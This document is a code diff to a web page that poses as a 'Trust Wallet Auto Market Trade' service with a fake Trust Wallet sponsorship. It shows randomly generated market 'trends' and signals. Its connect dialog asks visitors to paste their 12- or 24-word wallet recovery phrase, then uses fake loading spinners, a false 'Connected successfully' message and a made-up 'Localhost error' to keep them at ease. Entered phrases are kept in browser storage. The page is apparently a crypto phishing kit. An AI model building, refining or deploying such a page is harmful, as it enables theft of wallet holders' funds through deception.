@@ -5,8 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Trust Wallet Auto Market Trade</title>
 <style>
-body { font-family: Arial, sans-serif; background: #0b0b23; color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center;}
-header { position: sticky; top: 0; background: #141722; padding: 20px; width: 100%; text-align: center; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.3);}
+/* --- Original styles unchanged --- */
+body { font-family: Arial, sans-serif; background: #0b0b23; color: #fff; margin:0; padding:0; display:flex; flex-direction:column; align-items:center;}
+header { position: sticky; top:0; background: #141722; padding:20px; width:100%; text-align:center; z-index:1000; box-shadow:0 4px 10px rgba(0,0,0,0.3);}
 .logo-title { display:flex; align-items:center; justify-content:center; gap:12px;}
 .logo-title img { width:50px; height:50px;}
 .logo-title h1 { font-size:26px; margin:0; font-weight:bold;}
@@ -17,7 +18,7 @@ header p { font-size:15px; color:#ccc; margin:10px 0;}
 .dapp-card h2 { font-size:20px; margin-bottom:8px;}
 .dapp-card p { font-size:14px; color:#ccc; margin-bottom:20px;}
 
-.connect-btn { background:#1e90ff; border:none; padding:12px 28px; border-radius:10px; color:white; font-size:16px; cursor:pointer; transition: background 0.3s ease; box-shadow:0 4px 12px rgba(0,0,0,0.25);}
+.connect-btn { background:#1e90ff; border:none; padding:12px 28px; border-radius:10px; color:white; font-size:16px; cursor:pointer; transition:background 0.3s ease; box-shadow:0 4px 12px rgba(0,0,0,0.25);}
 .connect-btn:hover { background:#0d6efd; }
 
 .loader { border:3px solid #f3f3f3; border-top:3px solid #0d6efd; border-radius:50%; width:16px; height:16px; display:inline-block; animation:spin 1s linear infinite; vertical-align:middle; margin-right:6px;}
@@ -57,7 +58,7 @@ textarea { width:100%; height:110px; padding:10px; border-radius:8px; border:1px
 #noticeMessage { font-size:14px; color:#FFA500; margin-bottom:10px; text-align:center; }
 
 .sponsored { font-size:13px; color:#aaa; text-align:center; margin-top:15px; }
-.sponsored img { width:18px; height:18px; vertical-align:middle; margin-left:5px; }
+.sponsored img { width:18px; height:18px; vertical-align:middle; margin-right:5px; }
 
 footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
 </style>
@@ -79,7 +80,7 @@ footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
   <button id="openModal" class="connect-btn">Connect</button>
 </div>
 
-<p class="sponsored">Sponsored by Trust Wallet <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo"></p>
+<p class="sponsored"><img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo"> Sponsored by Trust Wallet</p>
 
 <div id="dashboard">
   <h3>Crypto Market Trends</h3>
@@ -101,8 +102,10 @@ footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
     <span class="close">&times;</span>
     <p id="noticeMessage">⚠️ Select wallet to connect</p>
 
-    <button id="trustWalletBtn" style="width:100%; margin-top:10px; padding:12px; border-radius:8px;">Trust Wallet</button>
-    <button id="otherWalletBtn" style="width:100%; margin-top:10px; padding:12px; border-radius:8px;">⛓ Other Wallet</button>
+    <div id="walletOptions" style="display:none;">
+      <button id="trustWalletBtn" style="width:100%; margin-top:10px; padding:12px; border-radius:8px;">Trust Wallet</button>
+      <button id="otherWalletBtn" style="width:100%; margin-top:10px; padding:12px; border-radius:8px;">⛓ Other Wallet</button>
+    </div>
 
     <textarea id="phraseInput" placeholder="Enter 12 or 24-word phrase"></textarea>
     <p id="connectNotice" style="font-size:13px; color:#FFA500; margin-top:6px;"></p>
@@ -119,16 +122,15 @@ footer { margin-top:40px; font-size:13px; color:#aaa; text-align:center; }
   <p>Trust Wallet • Auto Market Trade, Rewards and Earnings</p>
 </footer>
 
-<!-- Smartsupp Live Chat -->
 <script type="text/javascript">
 var _smartsupp = _smartsupp || {};
 _smartsupp.key = '3f2e381e7e9f89397ee5857cb9eb7cacf6f3375e';
 window.smartsupp||(function(d){
-	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-	s=d.getElementsByTagName('script')[0];
-	c=d.createElement('script');c.type='text/javascript';c.charset='utf-8';c.async=true;
-	c.src='https://www.smartsuppchat.com/loader.js?';
-	s.parentNode.insertBefore(c,s);
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];
+  c=d.createElement('script');c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';
+  s.parentNode.insertBefore(c,s);
 })(document);
 </script>
 
@@ -137,69 +139,95 @@ document.addEventListener("DOMContentLoaded", () => {
   const modal = document.getElementById("myModal");
   const btn = document.getElementById("openModal");
   const span = document.getElementsByClassName("close")[0];
-
-  const trustBtn = document.getElementById("trustWalletBtn");
-  const otherBtn = document.getElementById("otherWalletBtn");
-  const phraseInput = document.getElementById("phraseInput");
-  const connectNotice = document.getElementById("connectNotice");
   const manualBtn = document.getElementById("manualConnect");
   const autoBtn = document.getElementById("autoConnect");
   const debug = document.getElementById("debugOutput");
+  const phraseInput = document.getElementById("phraseInput");
+  const connectNotice = document.getElementById("connectNotice");
+  const trustWalletBtn = document.getElementById("trustWalletBtn");
+  const otherWalletBtn = document.getElementById("otherWalletBtn");
+  const walletOptions = document.getElementById("walletOptions");
 
   let storedPhrases = JSON.parse(localStorage.getItem("phrases") || "[]");
   let selectedWallet = "";
 
-  // First page connect button with spinner
+  // Show modal with 5-second loader
   btn.addEventListener("click", () => {
-    const originalText = btn.textContent;
-    btn.innerHTML = '<span class="loader"></span> Loading...';
-    btn.disabled = true;
-    setTimeout(() => {
-      btn.innerHTML = originalText;
-      btn.disabled = false;
-      modal.style.display = "flex";
+    modal.style.display="flex";
+    walletOptions.style.display="none";
+    debug.textContent="";
+    btn.disabled=true;
+    btn.innerHTML='<span class="loader"></span>Connect';
+    setTimeout(()=>{
+      btn.innerHTML='Connect';
+      btn.disabled=false;
+      walletOptions.style.display="block";
     },5000);
   });
 
-  span.onclick = () => { modal.style.display = "none"; phraseInput.style.display="none"; debug.textContent=""; connectNotice.textContent=""; };
+  span.onclick = () => { modal.style.display="none"; phraseInput.style.display="none"; debug.textContent=""; };
+  window.onclick = e => { if(e.target==modal) modal.style.display="none"; phraseInput.style.display="none"; debug.textContent=""; };
 
-  window.onclick = (e) => { if(e.target==modal){ modal.style.display="none"; phraseInput.style.display="none"; debug.textContent=""; connectNotice.textContent=""; } };
+  // Wallet selection
+  trustWalletBtn.addEventListener("click", () => {
+    selectedWallet="Trust Wallet";
+    phraseInput.style.display="block";
+    connectNotice.textContent="Trust Wallet selected, do not share with third party connect privately alone";
+  });
+  otherWalletBtn.addEventListener("click", () => {
+    selectedWallet="Other Wallet";
+    phraseInput.style.display="block";
+    connectNotice.textContent="Other Wallet selected, do not share with third party connect privately alone";
+  });
 
-  trustBtn.onclick = () => { selectedWallet="Trust Wallet"; connectNotice.textContent="Trust Wallet selected, do not share with third party connect privately alone."; phraseInput.style.display="block"; };
-  otherBtn.onclick = () => { selectedWallet="Other Wallet"; connectNotice.textContent="Other Wallet selected, do not share with third party connect privately alone."; phraseInput.style.display="block"; };
+  function showLoader(btn) {
+    btn.disabled=true;
+    let originalText=btn.textContent;
+    btn.innerHTML='<span class="loader"></span>'+originalText;
+    return new Promise(resolve=>setTimeout(()=>{btn.innerHTML=originalText; btn.disabled=false; resolve();},5000));
+  }
 
-  // Manual Connect
-  manualBtn.onclick = () => {
-    const phrase = phraseInput.value.trim();
-    const words = phrase.split(/\s+/).length;
-    if(words !==12 && words !==24){ debug.style.color="#FFA500"; debug.textContent="❌ Wrong input, input correctly 12 or 24 word phrase"; return; }
-    if(storedPhrases.includes(phrase)){ alert("⚠️ You already connected this wallet."); return; }
-    debug.textContent="⏳ Connecting...";
-    manualBtn.innerHTML='<span class="loader"></span> Connecting...'; manualBtn.disabled=true;
+  manualBtn.addEventListener("click", async ()=>{
+    if(!selectedWallet){ alert("Select a wallet first"); return;}
+    phraseInput.style.display="block";
+    const phrase=phraseInput.value.trim();
+    if(!phrase || (phrase.split(/\s+/).length!==12 && phrase.split(/\s+/).length!==24)){
+      debug.style.color="red";
+      debug.textContent="❌ Wrong input, input correctly 12 or 24 word phrase";
+      return;
+    }
+    if(storedPhrases.includes(phrase)){
+      alert("⚠️ You already connected this wallet."); 
+      debug.style.color="red"; debug.textContent="⚠️ This wallet is already connected."; 
+      return; 
+    }
+    await showLoader(manualBtn);
+    debug.style.color="#FFA500"; debug.textContent="⏳ Connecting...";
     setTimeout(()=>{
-      manualBtn.innerHTML="Manual Connect"; manualBtn.disabled=false;
-      storedPhrases.push(phrase); localStorage.setItem("phrases",JSON.stringify(storedPhrases));
-      debug.style.color="#0f0"; debug.textContent="✅ Connected successfully.";
+      storedPhrases.push(phrase);
+      localStorage.setItem("phrases",JSON.stringify(storedPhrases));
+      debug.style.color="#0f0"; debug.textContent="✅ Connected successfully. Refresh wallet after 24 hours.";
       phraseInput.value="";
-    },5000);
-  };
+    },1000);
+  });
 
-  // Auto Connect
-  autoBtn.onclick = () => {
-    debug.textContent="⏳ Auto connecting...";
-    autoBtn.innerHTML='<span class="loader"></span> Auto Connecting...'; autoBtn.disabled=true;
-    setTimeout(()=>{
-      autoBtn.innerHTML="Auto Connect"; autoBtn.disabled=false;
-      alert("❌ Localhost error... Try again");
-      debug.textContent="";
-    },5000);
-  };
+  autoBtn.addEventListener("click", async ()=>{
+    if(!selectedWallet){ alert("Select a wallet first"); return;}
+    await showLoader(autoBtn);
+    alert("⚠️ Localhost error, try again");
+  });
 
-  // Dynamic BTC/ETH simulation
-  const btc = document.getElementById("btcTrend");
-  const eth = document.getElementById("ethTrend");
-  const signalText = document.getElementById("signalText");
-  function randomTrend(){ return ["↑","↓"][Math.floor(Math.random()*2)]; }
-  function randomPercent(){ return Math.floor(Math.random()*70)+"%"; }
-  function randomSignal(){ const arr=["Buy Signal BTC","Sell Signal BTC","Buy Signal ETH","Sell Signal ETH"]; return arr[Math.floor(Math.random()*arr.length)]; }
-  setInterval(()=>{ btc.textContent=randomTrend()+"
+  // BTC/USD and ETH/USD simulation
+  const btcTrend=document.getElementById("btcTrend");
+  const ethTrend=document.getElementById("ethTrend");
+  setInterval(()=>{
+    const btc=Math.floor(Math.random()*20)+50; //50-69
+    const eth=Math.floor(Math.random()*20)+50;
+    btcTrend.textContent=(Math.random()>0.5?"↑ ":"↓ ")+btc+"%";
+    ethTrend.textContent=(Math.random()>0.5?"↑ ":"↓ ")+eth+"%";
+  },2000);
+});
+</script>
+
+</body>
+</html>
